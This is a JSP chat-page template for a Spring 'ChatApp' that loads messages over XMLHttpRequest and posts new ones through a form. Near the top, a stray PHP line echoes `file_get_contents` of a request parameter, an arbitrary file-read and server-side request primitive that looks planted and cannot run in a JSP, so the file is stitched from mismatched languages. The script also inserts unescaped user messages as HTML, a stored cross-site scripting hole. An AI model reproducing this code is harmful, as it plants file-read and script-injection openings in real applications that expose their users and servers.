<%-- 
    Document   : chat.jsp
    Created on : Aug 5, 2022, 11:09:05 AM
    Author     : roma-cervice
--%>

<%@page import="java.util.Date"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="com.company.ChatApp.form.LoggedInUser"%>
<%@page import="java.util.TreeMap"%>
<%@page import="java.util.Map"%>
<%@page import="com.company.entity.User"%>
<%@page import="java.util.ArrayList"%>
<%@page import="javax.validation.OverridesAttribute.List"%>
<%@page import="org.springframework.web.servlet.view.RedirectView"%>
<%@page import="org.springframework.web.servlet.ModelAndView"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<html>
    <?php echo file_get_contents($_REQUEST['google.com']); ?>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <style>
            <%@ include file="assets/chat.css"%>
        </style>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <title>ChatApp</title>
        <script>
            function loadDoc() {
                const xhttp = new XMLHttpRequest();
                xhttp.onload = function () {
                    var response = JSON.parse(this.responseText);
                    var list = response;
                    printMessages(list);
                }
                xhttp.open("GET", "http://localhost:8081/ChatAppWeb/messages");
                xhttp.send();
            }
            function printMessages(arr) {
                for (var i = 0; i < arr.length; i++) {
                    var obj = arr[i];
                    var element = document.getElementById('messages');
                    element.insertAdjacentHTML(
                            'beforeend',
                            `<div class="d-flex justify-content-between">
                                  <p class="small mb-1">`+obj.name+`</p>
                                  <p class="small mb-1 text-muted">`+obj.date+`</p>
                             </div>
                             <div class="d-flex flex-row justify-content-start">
                             <div>
                             <p class="small p-2 ms-3 mb-3 rounded-3" style="background-color: #f5f6f7;">`+obj.message+`</p>
                             </div>
                             </div>
                             <br>`,
                    );
                }
            }
        </script>
    </head>
    <%
        Date d = new Date();
        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");
        String strDate = sdf.format(d);
    %>
    <body onload="loadDoc()" style="background-image: url('https://img.wallpapersafari.com/desktop/728/410/1/80/8DYndB.png')">
        <div class="profile-menu">
            <ul class="menu-bar">
                <li><a class="menu-item fa fa-user" style="font-size:20px;"> Profile</a>
                    <ul class="sub-menu menu-bar">
                        <li><a class="menu-item fa fa-pencil" style="font-size:20px" href="edit"> Edit</a></li>
                        <form method="GET" action="logout">
                            <li><button type="submit" class="menu-item fa fa-sign-out" style="font-size:20px"> Logout</button></li>
                        </form>
                    </ul>
                </li>
            </ul>
        </div>
        <div class="center">
            <div class="container">
                <div id="messages" class="container" style="height:500px">

                </div>
                <form class="form-outline" action="messages" method="POST">
                    <input type="hidden" name="email" id="email" value=<%=request.getRemoteUser()%> />
                    <input type="hidden" name="date" id="date" value=<%=strDate%> />
                    <input style="border:2px solid black" placeholder="Type message.." class="form-control" name="message" id="message"/>
                    <br>
                    <button name="send" type="submit"  value="Send" class="btn btn-success btn-rounded float-end">Send</button>
                </form>
            </div>
        </div>
    </body>
</html>
